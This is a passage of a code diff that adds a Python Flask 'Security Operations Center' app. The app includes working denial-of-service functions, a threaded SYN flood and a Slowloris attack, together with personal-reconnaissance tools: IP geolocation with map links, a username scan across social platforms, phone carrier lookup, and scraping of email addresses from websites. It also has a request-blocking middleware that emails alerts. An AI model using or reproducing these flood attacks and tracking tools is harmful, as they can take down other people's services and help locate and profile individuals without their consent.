+                    stats['p'] += 1
+                except:
+                    pass
+        except:
+            pass
+
+    for _ in range(10):
+        threading.Thread(target=worker, daemon=True).start()
+
+    time.sleep(dur)
+    active = False
+
+    return f"SYN Flood Complete: {stats['p']} packets (requires admin)"
+
+def slowloris(host, dur=60):
+    socks = []
+    start = time.time()
+    active = True
+
+    def worker():
+        while active and time.time() - start < dur:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(4)
+                s.connect((host, 80))
+                s.send(f"GET /?{random.randint(1000,9999)} HTTP/1.1\r\nHost: {host}\r\n".encode())
+                socks.append(s)
+            except:
+                pass
+            for s in socks[:]:
+                try:
+                    s.send(f"X-a: {random.randint(1000,9999)}\r\n".encode())
+                except:
+                    try:
+                        socks.remove(s)
+                        s.close()
+                    except:
+                        pass
+            time.sleep(3)
+
+    threading.Thread(target=worker, daemon=True).start()
+    time.sleep(dur)
+    active = False
+
+    for s in socks:
+        try:
+            s.close()
+        except:
+            pass
+
+    return f"Slowloris Complete: {len(socks)} sockets"
+
+def ip_lookup(ip):
+    try:
+        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=10)
+        if r.status_code == 200:
+            d = r.json()
+            return {
+                'ip': d.get('query'), 'country': d.get('country'),
+                'city': d.get('city'), 'region': d.get('regionName'),
+                'isp': d.get('isp'), 'org': d.get('org'),
+                'timezone': d.get('timezone'),
+                'lat': d.get('lat'), 'lon': d.get('lon'),
+                'proxy': d.get('proxy'), 'hosting': d.get('hosting'),
+                'maps': f"https://maps.google.com/?q={d.get('lat')},{d.get('lon')}"
+            }
+    except:
+        pass
+    return {'error': 'not found'}
+
+def username_scan(username):
+    platforms = {
+        'instagram': f'https://www.instagram.com/{username}/',
+        'tiktok': f'https://www.tiktok.com/@{username}',
+        'twitter': f'https://x.com/{username}',
+        'youtube': f'https://www.youtube.com/@{username}',
+        'github': f'https://github.com/{username}',
+        'reddit': f'https://www.reddit.com/user/{username}',
+        'telegram': f'https://t.me/{username}',
+        'snapchat': f'https://www.snapchat.com/add/{username}',
+    }
+    found = {}
+    for name, url in platforms.items():
+        try:
+            r = requests.get(url, timeout=5, allow_redirects=False,
+                           headers={'User-Agent': 'Mozilla/5.0'})
+            if r.status_code == 200:
+                found[name] = url
+        except:
+            pass
+    return found
+
+def phone_lookup(number):
+    clean = re.sub(r'[\s\-\(\)\+]', '', number)
+    data = {'number': '+' + clean}
+    if clean.startswith('966'):
+        data['country'] = 'Saudi Arabia'
+        if clean[3:].startswith('5'):
+            data['type'] = 'Mobile'
+            prefix = clean[3:5]
+            carriers = {'50': 'STC', '55': 'STC', '54': 'Mobily', '58': 'Zain'}
+            data['carrier'] = carriers.get(prefix, 'Unknown')
+    return data
+
+def site_recon(url):
+    data = {'url': url}
+    try:
+        host = url.split('/')[2] if '://' in url else url
+        data['host'] = host
+        data['ip'] = socket.gethostbyname(host)
+        geo = ip_lookup(data['ip'])
+        data.update(geo)
+    except:
+        pass
+    try:
+        r = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
+        if r.status_code == 200:
+            data['server'] = r.headers.get('Server', 'N/A')
+            data['status'] = r.status_code
+            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r.text)
+            data['emails'] = list(set(e.lower() for e in emails))[:10]
+    except:
+        pass
+    return data
+
+# ═══ ATTACK DETECTION MIDDLEWARE ═══
+
+@app.before_request
+def detect_attacks():
+    threats = detect_attack(
+        request.query_string.decode('utf-8', errors='ignore'),
+        request.path,
+        request.headers
+    )
+
+    if threats:
+        ip = get_client_ip()
+        attack = {
+            'time': datetime.now().strftime('%H:%M:%S'),
+            'type': ', '.join(threats),
+            'ip': ip,
+            'detail': f"{request.method} {request.path}",
+            'user_agent': request.headers.get('User-Agent', ''),
+        }
+        attacks.append(attack)
+
+        # email alert
+        body = f"""
+        <h3 style="color:#ff0041;">ATTACK DETECTED</h3>
+        <p>Type: <b>{attack['type']}</b></p>
+        <p>IP: <b>{ip}</b></p>
+        <p>Path: {request.path}</p>
+        <p>Query: {request.query_string.decode('utf-8', errors='ignore')[:200]}</p>
+        <p>User Agent: {attack['user_agent'][:100]}</p>
+        """
+        threading.Thread(
+            target=send_email,
+            args=(f"ATTACK: {attack['type']} from {ip}", body),
+            daemon=True
+        ).start()
+
+        return jsonify({'error': 'blocked', 'threats': threats}), 403
+
+# ═══ MAIN ═══
+
+if __name__ == '__main__':
+    print(f"""
+    ╔══════════════════════════════════════╗
+    ║  507_kantr WEB v1.0                  ║
+    ║  Security Operations Center          ║
+    ╚══════════════════════════════════════╝
+
+    Dashboard:  http://localhost:5000
+    Track Link: http://localhost:5000/t/{TRACKING_TOKEN}
+    Email:      {ADMIN_EMAIL}
+
+    GMAIL SETUP:
+    1. Go to: https://myaccount.google.com/apppasswords
+    2. Generate app password
+    3. Update GMAIL_PASS in this script
+
+    Press Ctrl+C to stop
+    """)
+
+    app.run(host='0.0.0.0', port=5000, debug=False)
